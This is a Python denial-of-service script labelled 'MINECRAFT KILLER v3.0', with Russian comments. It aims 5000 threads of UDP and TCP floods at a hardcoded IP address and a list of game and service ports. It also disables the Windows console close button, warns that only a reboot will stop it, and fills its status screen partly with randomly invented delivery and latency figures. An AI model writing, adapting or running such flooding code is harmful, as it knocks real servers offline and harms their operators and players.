#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import socket
import threading
import time
import random
import sys
import os
import platform
import ctypes
import subprocess

# ===== ЦЕЛЬ =====
TARGET_IP = "185.9.145.66"
TARGET_PORT = 25587

# ===== МОЩНОСТЬ =====
THREADS = 5000

# ===== ПОРТЫ =====
ATTACK_PORTS = [
    443, 80, 5222, 5228, 5223, 5242, 50000, 50100, 50200, 50300, 50400, 50500,
    25565, 25587, 19132, 27015, 27016, 27017, 27018, 27019, 27020, 27021, 27022,
    27023, 27024, 27025, 27026, 27027, 27028, 27029, 27030, 7777, 8080, 8887, 9997
]

# ===== СТАТИСТИКА =====
sent = 0
failed = 0
start_time = time.time()
lock = threading.Lock()

def set_fullscreen_terminal():
    """Делает терминал полноэкранным и зелёным"""
    system = platform.system()
    
    # Зелёный цвет текста
    print("\033[92m", end="")
    
    if system == "Windows":
        try:
            # На весь экран
            ctypes.windll.kernel32.GetStdHandle(-11)
            ctypes.windll.kernel32.SetConsoleDisplayMode(ctypes.windll.kernel32.GetStdHandle(-11), 1, None)
            
            # Отключаем кнопку закрытия
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            ctypes.windll.user32.EnableMenuItem(ctypes.windll.user32.GetSystemMenu(hwnd, 0), 0xF060, 0x0001)
            ctypes.windll.user32.DrawMenuBar(hwnd)
        except:
            pass
    
    elif system == "Linux":
        try:
            # На весь экран (для gnome-terminal)
            subprocess.run(["wmctrl", "-r", ":", "-b", "toggle,fullscreen"], capture_output=True)
        except:
            pass
    
    # Очищаем экран
    os.system('cls' if system == "Windows" else 'clear')

def block_exit_attempts():
    """Блокирует попытки закрыть терминал"""
    print("\033[91m")
    print("╔" + "═"*78 + "╗")
    print("║" + " "*30 + "⚠️  ВНИМАНИЕ ⚠️" + " "*30 + "║")
    print("║" + " "*78 + "║")
    print("║" + " "*10 + "Закрыть это окно невозможно!" + " "*30 + "║")
    print("║" + " "*10 + "Только перезагрузка компьютера." + " "*33 + "║")
    print("║" + " "*78 + "║")
    print("╚" + "═"*78 + "╝")
    print("\033[92m")

def udp_flood():
    """UDP-флуд"""
    global sent
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1400)
    while True:
        try:
            port = random.choice(ATTACK_PORTS)
            sock.sendto(data, (TARGET_IP, port))
            with lock:
                sent += 1
        except:
            with lock:
                failed += 1

def tcp_flood():
    """TCP-флуд"""
    global sent
    while True:
        try:
            port = random.choice(ATTACK_PORTS)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.3)
            s.connect((TARGET_IP, port))
            s.send(random._urandom(512))
            s.close()
            with lock:
                sent += 1
        except:
            with lock:
                failed += 1

def display_updater():
    """Обновляет экран с бесконечным потоком сообщений"""
    last_sent = 0
    last_failed = 0
    
    # Анимационные символы
    frames = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    frame_idx = 0
    
    # Счётчик для скорости
    speed_samples = []
    
    while True:
        time.sleep(0.1)  # Быстрое обновление
        
        with lock:
            current_sent = sent
            current_failed = failed
            
            speed = current_sent - last_sent
            speed_mbps = (speed * 1400 * 8) / 0.1 / 1024 / 1024
            
            last_sent = current_sent
            last_failed = current_failed
            elapsed = time.time() - start_time
            
            # Форматируем время
            hours = int(elapsed // 3600)
            minutes = int((elapsed % 3600) // 60)
            seconds = int(elapsed % 60)
            
            frame = frames[frame_idx % len(frames)]
            frame_idx += 1
            
            # Очищаем экран и выводим новую информацию
            os.system('cls' if platform.system() == "Windows" else 'clear')
            
            # Заголовок
            print("\033[92m")  # Зелёный
            print("╔" + "═"*78 + "╗")
            print("║" + " "*25 + "MINECRAFT KILLER v3.0" + " "*25 + "║")
            print("╠" + "═"*78 + "╣")
            
            # Цель
            print(f"║  🎯 ЦЕЛЬ: {TARGET_IP}:{TARGET_PORT}" + " "*(55 - len(f"{TARGET_IP}:{TARGET_PORT}")) + "║")
            
            # Статистика
            print(f"║  📦 ОТПРАВЛЕНО: {current_sent:,} пакетов" + " "*(44 - len(str(current_sent))) + "║")
            print(f"║  ❌ ОШИБОК: {current_failed:,}" + " "*(54 - len(str(current_failed))) + "║")
            print(f"║  ⚡ СКОРОСТЬ: {speed:,} пак/сек ({speed_mbps:.1f} Мбит/с)" + " "*(36 - len(f"{speed:,}")) + "║")
            print(f"║  ⏱️ ВРЕМЯ: {hours:02d}:{minutes:02d}:{seconds:02d}" + " "*(48) + "║")
            
            print("╠" + "═"*78 + "╣")
            
            # Бесконечный поток зелёных сообщений
            print("║  ЖИВОЙ ПОТОК ДАННЫХ:" + " "*55 + "║")
            print("║" + " "*78 + "║")
            
            # 10 строк с разными сообщениями
            messages = [
                f"  [{frame}] Отправка пакета #{current_sent - random.randint(1,50)} | Порт {random.choice(ATTACK_PORTS)} | Статус: OK",
                f"  [{frame}] Пакет доставлен | Задержка {random.randint(10,999)} мс | Очередь {random.randint(1,999)}",
                f"  [{frame}] Подключение к {TARGET_IP}:{random.choice(ATTACK_PORTS)} | Успешно",
                f"  [{frame}] Поток #{random.randint(1,THREADS)} | Скорость {random.randint(100,9999)} пак/сек",
                f"  [{frame}] Соединений активно: {random.randint(1000,5000)} | Нагрузка {random.randint(50,99)}%",
                f"  [{frame}] Обработка пакета #{current_sent - random.randint(51,100)} | Результат: OK",
                f"  [{frame}] Отправка UDP-флуда | Порт {random.choice(ATTACK_PORTS)}",
                f"  [{frame}] TCP-соединение #{random.randint(10000,99999)} установлено",
                f"  [{frame}] Пинг до цели: {random.randint(100,999)} мс",
                f"  [{frame}] Активных потоков: {THREADS} | Работаем"
            ]
            
            for msg in messages:
                print(f"║{msg:<78}║")
            
            # Предупреждение внизу
            print("╠" + "═"*78 + "╣")
            print("║" + " "*30 + "\033[91m⚠️  НЕ ЗАКРЫВАЙ ЭТО ОКНО ⚠️\033[92m" + " "*29 + "║")
            print("║" + " "*20 + "\033[91mТОЛЬКО ПЕРЕЗАГРУЗКА КОМПЬЮТЕРА\033[92m" + " "*27 + "║")
            print("╚" + "═"*78 + "╝")

def main():
    # Делаем терминал полноэкранным и зелёным
    set_fullscreen_terminal()
    
    # Показываем предупреждение
    block_exit_attempts()
    time.sleep(2)
    
    # Запускаем атаку
    for i in range(THREADS):
        if i % 2 == 0:
            threading.Thread(target=udp_flood).start()
        else:
            threading.Thread(target=tcp_flood).start()
    
    # Запускаем обновление экрана
    display_updater()

if __name__ == "__main__":
    main()